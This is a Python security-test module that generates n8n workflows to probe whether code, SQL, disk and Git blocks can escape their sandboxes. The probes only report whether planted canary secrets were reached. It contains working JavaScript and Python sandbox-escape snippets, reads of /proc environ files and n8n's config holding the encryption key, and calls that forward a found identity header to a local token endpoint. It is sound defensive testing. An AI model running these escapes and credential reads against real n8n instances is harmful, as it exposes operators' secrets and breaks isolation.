"""The probes, as code given to each block and as the workflows that run them.

Every probe returns booleans (or an HTTP status). Each canary starts with P9CANARY-<NAME>-, and a probe
only asks whether some text it reached contains that prefix. A probe that finds the identity header uses
it to call the stand-in endpoint, which records whether the header matched, and the probe then drops it.
"""

import json

from lib import link, merge_links, node

NAMES = ["ENCKEY", "DBPASS", "NODEKEY", "STARTSECRET", "IDHEADER", "RUNNERTOKEN"]
HOME = "/home/node"
READ_TARGETS = {
    "n8n_config": f"{HOME}/.n8n/config",
    "proc_self_environ": "/proc/self/environ",
    "proc_1_environ": "/proc/1/environ",
    "outside": f"{HOME}/p9-outside.txt",
    "allowed_folder": f"{HOME}/.n8n-files/p9-control.txt",
    "link_to_n8n_config": f"{HOME}/.n8n-files/p9-link",
}
WRITE_TARGETS = {
    "n8n_custom_folder": f"{HOME}/.n8n/custom/p9-marker.txt",
    "outside": f"{HOME}/p9-write-outside.txt",
    "allowed_folder": f"{HOME}/.n8n-files/p9-write.txt",
}
MARKERS = {"encryptionKey_marker": '"encryptionKey"', "control_marker": "P9MARKER-CONTROL", "outside_marker": "P9MARKER-OUTSIDE"}

# ---------------------------------------------------------------------------------------------------
# JavaScript. One body for every block that runs JavaScript; the parts a block lacks (require, helpers,
# $env) fail inside their own try, so the same code tells what each block's sandbox offers.
# ---------------------------------------------------------------------------------------------------

JS_SCAN = """
const NAMES = %s;
const MARKERS = %s;
const scan = (text) => { const s = typeof text === 'string' ? text : ''; const r = {}; for (const n of NAMES) r[n] = s.includes('P9CANARY-' + n); for (const [k, m] of Object.entries(MARKERS)) r[k] = s.includes(m); return r; };
const headerIn = (text) => { if (typeof text !== 'string') return null; for (const l of text.split(/[\\u0000\\n]/)) if (l.startsWith('IDENTITY_HEADER=')) return l.slice(16); return null; };
const envText = (e) => Object.entries(e || {}).map(([k, v]) => k + '=' + v).join('\\n');
""" % (json.dumps(NAMES), json.dumps(MARKERS))

JS_SYNC = """
const out = { ran: true };
let header = null;
try { out.process_defined = typeof process !== 'undefined' && !!process.env; if (out.process_defined) { const t = envText(process.env); out.process_env = scan(t); header = header || headerIn(t); } } catch (e) { out.process_defined = false; }
out.dollar_env_defined = typeof $env !== 'undefined';
if (out.dollar_env_defined) { try { const v = $env.WAB_NODE_KEY; out.dollar_env_refused = false; out.dollar_env_nodekey = scan(String(v)).NODEKEY; } catch (e) { out.dollar_env_refused = true; } }
out.fetch_defined = typeof fetch === 'function';
const tries = {
  this_constructor: () => this.constructor.constructor('return process')(),
  async_function: () => (async () => {}).constructor('return process')(),
  buffer_constructor: () => Buffer.constructor('return process')(),
  require_constructor: () => require.constructor('return process')(),
};
out.escape = {};
const pending = [];
for (const [k, f] of Object.entries(tries)) {
  try { const p = f();
        if (p && typeof p.then === 'function') { out.escape[k] = { made_a_function: true, got_a_process: false }; pending.push([k, p]); p.catch(() => {}); continue; }
        const t = p && p.env ? envText(p.env) : ''; out.escape[k] = { made_a_function: true, got_a_process: !!(p && p.env), ...scan(t) }; header = header || headerIn(t); }
  catch (e) { out.escape[k] = { made_a_function: false, got_a_process: false }; }
}
const mods = {};
for (const m of ['fs', 'child_process', 'http', 'process']) { try { require(m); mods[m] = true; } catch (e) { mods[m] = false; } }
out.require = mods;
if (mods.fs) {
  const fs = require('fs');
  const read = (p) => { const r = { exists: false, opened: false }; try { r.exists = fs.existsSync(p); const t = fs.readFileSync(p, 'latin1'); r.opened = true; Object.assign(r, scan(t)); header = header || headerIn(t); } catch (e) {} return r; };
  let ppid = null; try { ppid = fs.readFileSync('/proc/self/stat', 'latin1').split(') ')[1].split(' ')[1]; } catch (e) {}
  out.files = { proc_self_environ: read('/proc/self/environ'), proc_1_environ: read('/proc/1/environ'),
                proc_parent_environ: ppid ? read('/proc/' + ppid + '/environ') : { exists: false, opened: false },
                n8n_config: read('/home/node/.n8n/config') };
}
if (mods.process) { try { const t = envText(require('process').env); out.require_process_env = scan(t); header = header || headerIn(t); } catch (e) {} }
try { const m = require('@langchain/core/utils/env'); out.langchain_env_module = true;
      const t = ['N8N_ENCRYPTION_KEY', 'DB_POSTGRESDB_PASSWORD', 'WAB_NODE_KEY', 'WAB_START_SECRET', 'IDENTITY_HEADER', 'N8N_RUNNERS_AUTH_TOKEN'].map((k) => k + '=' + (m.getEnvironmentVariable(k) || '')).join('\\n');
      out.langchain_env = scan(t); header = header || headerIn(t); } catch (e) { out.langchain_env_module = false; }
const h = (typeof helpers !== 'undefined' && helpers) || (this && this.helpers) || null;
out.helpers_defined = !!h;
"""

JS_ASYNC = """
for (const [k, pr] of pending) { try { const p = await pr; const t = p && p.env ? envText(p.env) : ''; out.escape[k].got_a_process = !!(p && p.env); Object.assign(out.escape[k], scan(t)); header = header || headerIn(t); } catch (e) { out.escape[k].ran_and_threw = true; } }
if (h && typeof h.createReadStream === 'function') {
  const viaHelper = async (p) => {
    const r = { opened: false, blocked: false };
    try {
      const rp = typeof h.resolvePath === 'function' ? await h.resolvePath(p) : p; const s = await h.createReadStream(rp);
      const t = await new Promise((res, rej) => { const parts = []; s.on('data', (c) => parts.push(Buffer.from(c))); s.on('end', () => res(Buffer.concat(parts).toString('latin1'))); s.on('error', rej); });
      r.opened = true; Object.assign(r, scan(t)); header = header || headerIn(t);
    } catch (e) { const m = String(e && e.message); r.blocked = /not allowed/i.test(m); r.unsupported = /not supported|unsupported|not available/i.test(m); }
    return r;
  };
  out.helper_files = {};
  for (const [k, p] of Object.entries(%s)) out.helper_files[k] = await viaHelper(p);
}
const url = (label) => 'http://localhost:42356/msi/token?api-version=2019-08-01&resource=https%%3A%%2F%%2Fvault.azure.net&p9probe=' + TAG + '-' + label;
const kind = (e) => { const m = [e && e.message, e && e.name, e && e.code].map(String).join(' '); return /ECONNREFUSED/.test(m) ? 'connection refused' : /SSRF|blocked|restricted IP|not allowed|forbidden|disallowed/i.test(m) ? 'blocked by n8n' : /timeout|ETIMEDOUT/i.test(m) ? 'timed out' : 'other'; };
const callHelper = async (label, headers) => { try { const r = await h.httpRequest({ url: url(label), headers, returnFullResponse: true, ignoreHttpStatusErrors: true, timeout: 5000 }); return r.statusCode; } catch (e) { out.identity[label + '_failed'] = kind(e); return 0; } };
out.identity = { header_visible: !!header };
if (h && typeof h.httpRequest === 'function') {
  out.identity.helper_no_header = await callHelper('helper-noheader', {});
  if (header) out.identity.helper_with_header = await callHelper('helper-header', { 'X-IDENTITY-HEADER': header });
}
if (mods.http) {
  const direct = (label, headers) => new Promise((resolve) => { try { const req = require('http').get(url(label), { headers, timeout: 5000 }, (res) => { res.resume(); resolve(res.statusCode); }); req.on('error', (e) => { out.identity[label + '_failed'] = kind(e); resolve(0); }); req.on('timeout', () => { req.destroy(); resolve(0); }); } catch (e) { resolve(0); } });
  out.identity.direct_no_header = await direct('direct-noheader', {});
  if (header) out.identity.direct_with_header = await direct('direct-header', { 'X-IDENTITY-HEADER': header });
}
header = null;
""" % json.dumps(READ_TARGETS)


def js_probe(tag: str, returns: str) -> str:
    """returns: 'items' for Code, Function, LangChain Code and AI Transform; 'json' for Function Item; 'string' for Code Tool."""
    ret = {"items": "return [{ json: out }];", "json": "return out;", "string": "return JSON.stringify(out);"}[returns]
    return f"const TAG = {json.dumps(tag)};\n" + JS_SCAN + JS_SYNC + JS_ASYNC + ret


def js_sort_probe(tag: str) -> str:
    """Sort and Item Lists run code inside a comparator, so the probe is synchronous and writes its
    result onto the items it compares. Their sandbox has no require, helpers or $env (nodeMode runCode)."""
    return (
        f"if (!globalThis.__p9) {{ globalThis.__p9 = true; const TAG = {json.dumps(tag)};\n"
        + JS_SCAN
        + JS_SYNC
        + "header = null; a.json.p9 = JSON.stringify(out); b.json.p9 = a.json.p9; }\nreturn 0;"
    )


# ---------------------------------------------------------------------------------------------------
# Python. The runner checks code before it runs it, and refuses the whole task on a forbidden import
# or attribute, so each question is its own block.
# ---------------------------------------------------------------------------------------------------

PY_HEAD = f"NAMES = {json.dumps(NAMES)}\nout = {{'ran': True}}\n"
PY_PROBES = {
    "plain": PY_HEAD + """
try:
    f = open('/proc/1/environ', 'rb')
    t = f.read().decode('latin-1')
    out['open_proc_1_environ'] = {n: ('P9CANARY-' + n) in t for n in NAMES}
except Exception:
    out['open_refused'] = True
""",
    "import_os": PY_HEAD + """
import os
t = '\\n'.join(k + '=' + v for k, v in os.environ.items())
out['os_environ'] = {n: ('P9CANARY-' + n) in t for n in NAMES}
def rd(p):
    r = {'opened': False}
    try:
        fd = os.open(p, os.O_RDONLY)
        data = b''
        while True:
            c = os.read(fd, 65536)
            if not c:
                break
            data += c
        os.close(fd)
        s = data.decode('latin-1')
        r['opened'] = True
        for n in NAMES:
            r[n] = ('P9CANARY-' + n) in s
    except Exception:
        pass
    return r
out['proc_1_environ'] = rd('/proc/1/environ')
out['proc_parent_environ'] = rd('/proc/%d/environ' % os.getppid())
out['n8n_config'] = rd('/home/node/.n8n/config')
""",
    "dunder": PY_HEAD + """
x = ().__class__.__base__.__subclasses__()
out['subclasses_reached'] = len(x) > 0
""",
}


def py_probe(kind: str, returns: str) -> str:
    return PY_PROBES[kind] + ("return [{'json': out}]" if returns == "items" else "return str(out)")


# ---------------------------------------------------------------------------------------------------
# Workflows. Each starts with a Manual Trigger and is run by hand through n8n's own REST call.
# ---------------------------------------------------------------------------------------------------

SOFT = {"onError": "continueRegularOutput"}
TRIGGER = node("Run by hand", "n8n-nodes-base.manualTrigger", {}, (0, 0))


def two_items():
    return node("Two items", "n8n-nodes-base.set", {"assignments": {"assignments": [
        {"id": "l", "name": "list", "value": "={{ [2, 1] }}", "type": "array"}]}, "options": {}}, (200, 0), tv=3.4)


def code_blocks(tag_prefix: str):
    """(label, nodes, connections, node to read, how to read it)."""
    out = []

    def single(label, n):
        out.append((label, [TRIGGER, n], link(("Run by hand", n["name"])), n["name"], "json"))

    single("code_js", node("Probe", "n8n-nodes-base.code", {"language": "javaScript", "mode": "runOnceForAllItems",
                                                            "jsCode": js_probe(f"{tag_prefix}code-js", "items")}, (200, 0), tv=2, **SOFT))
    for kind in PY_PROBES:
        single(f"code_python_{kind}", node("Probe", "n8n-nodes-base.code", {"language": "pythonNative", "mode": "runOnceForAllItems",
                                                                          "pythonCode": py_probe(kind, "items")}, (200, 0), tv=2, **SOFT))
    single("ai_transform", node("Probe", "n8n-nodes-base.aiTransform", {"instructions": "p9", "jsCode": js_probe(f"{tag_prefix}ai-transform", "items")}, (200, 0), **SOFT))
    single("function", node("Probe", "n8n-nodes-base.function", {"functionCode": js_probe(f"{tag_prefix}function", "items")}, (200, 0), **SOFT))
    single("function_item", node("Probe", "n8n-nodes-base.functionItem", {"functionCode": js_probe(f"{tag_prefix}function-item", "json")}, (200, 0), **SOFT))
    single("langchain_code", node("Probe", "@n8n/n8n-nodes-langchain.code", {
        "code": {"execute": {"code": js_probe(f"{tag_prefix}langchain-code", "items")}},
        "inputs": {"input": [{"type": "main"}]}, "outputs": {"output": [{"type": "main"}]}}, (200, 0), **SOFT))
    for label, type_, params in [
        ("sort_code", "n8n-nodes-base.sort", {"type": "code", "code": js_sort_probe(f"{tag_prefix}sort")}),
        ("item_lists_code", "n8n-nodes-base.itemLists", {"resource": "itemList", "operation": "sort", "type": "code", "code": js_sort_probe(f"{tag_prefix}item-lists")}),
    ]:
        tv = 3.1 if type_.endswith("itemLists") else 1
        nodes = [TRIGGER, two_items(), node("Split", "n8n-nodes-base.splitOut", {"fieldToSplitOut": "list"}, (400, 0)),
                 node("Probe", type_, params, (600, 0), tv=tv, **SOFT)]
        out.append((label, nodes, link(("Run by hand", "Two items"), ("Two items", "Split"), ("Split", "Probe")), "Probe", "p9"))
    # Merge's SQL mode runs AlaSQL in an isolate inside n8n. The first query is the control; the others ask
    # AlaSQL for a file in the allowed folder, n8n's config, n8n's environment and a URL.
    for name, q in [
        ("control", "SELECT * FROM input1"),
        ("allowed_folder", "SELECT * FROM TXT('/home/node/.n8n-files/p9-control.txt')"),
        ("n8n_config", "SELECT * FROM TXT('/home/node/.n8n/config')"),
        ("proc_self_environ", "SELECT * FROM TXT('/proc/self/environ')"),
        ("url", "SELECT * FROM JSON('http://localhost:42356/msi/token?p9probe=" + tag_prefix + "merge-sql')"),
    ]:
        merge = node("Probe", "n8n-nodes-base.merge", {"mode": "combineBySql", "query": q}, (200, 0), tv=3.2, **SOFT)
        conns = {"Run by hand": {"main": [[{"node": "Probe", "type": "main", "index": 0}, {"node": "Probe", "type": "main", "index": 1}]]}}
        out.append((f"merge_sql_{name}", [TRIGGER, merge], conns, "Probe", "scan"))
    # A control: n8n's own HTTP Request block, to the identity endpoint, with no header.
    single("http_request_control", node("Probe", "n8n-nodes-base.httpRequest", {
        "method": "GET", "url": f"http://localhost:42356/msi/token?api-version=2019-08-01&p9probe={tag_prefix}http-request",
        "options": {"response": {"response": {"fullResponse": True, "neverError": True}}}}, (200, 0), tv=4.2, **SOFT))
    return out


def agent_workflow(tag_prefix: str, credential: dict):
    """An AI Agent with a stand-in model that calls both Code Tools once."""
    nodes = [
        TRIGGER,
        node("Agent", "@n8n/n8n-nodes-langchain.agent", {"promptType": "define", "text": "Run the probes.", "options": {}}, (300, 0), tv=2.2, **SOFT),
        node("Model", "@n8n/n8n-nodes-langchain.lmChatOpenAi", {
            "model": {"__rl": True, "value": "gpt-4o-mini", "mode": "list", "cachedResultName": "gpt-4o-mini"},
            "options": {}, "responsesApiEnabled": False}, (200, 200), tv=1.2, credentials={"openAiApi": credential}),
        node("JS tool", "@n8n/n8n-nodes-langchain.toolCode", {
            "name": "p9_js", "description": "Runs the P9 probe in JavaScript", "language": "javaScript",
            "jsCode": js_probe(f"{tag_prefix}code-tool-js", "string")}, (400, 200), tv=1.3),
        node("Python tool", "@n8n/n8n-nodes-langchain.toolCode", {
            "name": "p9_py", "description": "Runs the P9 probe in Python", "language": "python",
            "pythonCode": py_probe("plain", "string")}, (600, 200), tv=1.3),
    ]
    conns = merge_links(
        link(("Run by hand", "Agent")),
        link(("Model", "Agent"), kind="ai_languageModel"),
        link(("JS tool", "Agent"), ("Python tool", "Agent"), kind="ai_tool"),
    )
    return nodes, conns


# Disk blocks. A read goes on to Extract from File and an Edit Fields block whose expressions say only
# whether the text holds a canary or a marker, so no file's text is ever returned by the probe.
def _scan_fields():
    assigns = [{"id": f"c{i}", "name": n, "value": f"={{{{ String($json.text || '').includes('P9CANARY-{n}') }}}}", "type": "boolean"} for i, n in enumerate(NAMES)]
    assigns += [{"id": f"m{i}", "name": k, "value": f"={{{{ String($json.text || '').includes({json.dumps(m)}) }}}}", "type": "boolean"} for i, (k, m) in enumerate(MARKERS.items())]
    return node("Scan", "n8n-nodes-base.set", {"assignments": {"assignments": assigns}, "options": {}}, (600, 0), tv=3.4, alwaysOutputData=True)


def disk_reads():
    out = []
    readers = {
        "read_write_file": lambda p: node("Disk", "n8n-nodes-base.readWriteFile", {"operation": "read", "fileSelector": p, "options": {}}, (200, 0), tv=1.1, **SOFT),
        "read_binary_file": lambda p: node("Disk", "n8n-nodes-base.readBinaryFile", {"filePath": p, "dataPropertyName": "data"}, (200, 0), **SOFT),
        "read_binary_files": lambda p: node("Disk", "n8n-nodes-base.readBinaryFiles", {"fileSelector": p, "dataPropertyName": "data"}, (200, 0), **SOFT),
    }
    for block, make in readers.items():
        for target, path in READ_TARGETS.items():
            nodes = [TRIGGER, make(path),
                     node("Extract", "n8n-nodes-base.extractFromFile", {"operation": "text", "binaryPropertyName": "data", "destinationKey": "text", "options": {}}, (400, 0), tv=1.1, **SOFT),
                     _scan_fields()]
            out.append((f"{block}:read:{target}", nodes, link(("Run by hand", "Disk"), ("Disk", "Extract"), ("Extract", "Scan"))))
    return out


def disk_writes():
    out = []
    writers = {
        "read_write_file": lambda p: node("Disk", "n8n-nodes-base.readWriteFile", {"operation": "write", "fileName": p, "dataPropertyName": "data", "options": {}}, (600, 0), tv=1.1, **SOFT),
        "write_binary_file": lambda p: node("Disk", "n8n-nodes-base.writeBinaryFile", {"fileName": p, "dataPropertyName": "data", "options": {}}, (600, 0), **SOFT),
    }
    for block, make in writers.items():
        for target, path in WRITE_TARGETS.items():
            nodes = [TRIGGER,
                     node("Text", "n8n-nodes-base.set", {"assignments": {"assignments": [{"id": "t", "name": "text", "value": "P9 harmless marker", "type": "string"}]}, "options": {}}, (200, 0), tv=3.4),
                     node("To file", "n8n-nodes-base.convertToFile", {"operation": "toText", "sourceProperty": "text", "binaryPropertyName": "data", "options": {"fileName": "p9.txt"}}, (400, 0), tv=1.1),
                     make(path)]
            out.append((f"{block}:write:{target}", path, nodes, link(("Run by hand", "Text"), ("Text", "To file"), ("To file", "Disk"))))
    return out


def other_disk():
    """Git and Execute Sub-workflow: error class only. No probe makes a git repository, so a Git block
    that gets past n8n's path check stops at git's own "not a git repository"."""
    out = []
    git = [
        ("git_status:n8n_folder", {"operation": "status", "repositoryPath": f"{HOME}/.n8n"}),
        ("git_clone_from:n8n_folder", {"operation": "clone", "repositoryPath": f"{HOME}/.n8n-files/p9-clone", "sourceRepository": f"{HOME}/.n8n", "authentication": "none"}),
        ("git_clone_into:n8n_custom_folder", {"operation": "clone", "repositoryPath": f"{HOME}/.n8n/custom/p9-clone", "sourceRepository": f"{HOME}/.n8n-files", "authentication": "none"}),
        ("git_status:allowed_folder", {"operation": "status", "repositoryPath": f"{HOME}/.n8n-files"}),
    ]
    for label, params in git:
        out.append((label, [TRIGGER, node("Disk", "n8n-nodes-base.git", params, (200, 0), tv=1.1, **SOFT)], link(("Run by hand", "Disk"))))
    for target in ("n8n_config", "allowed_folder", "outside"):
        params = {"source": "localFile", "workflowPath": READ_TARGETS[target], "options": {}}
        out.append((f"execute_sub_workflow_file:{target}", [TRIGGER, node("Disk", "n8n-nodes-base.executeWorkflow", params, (200, 0), tv=1.1, **SOFT)], link(("Run by hand", "Disk"))))
    return out
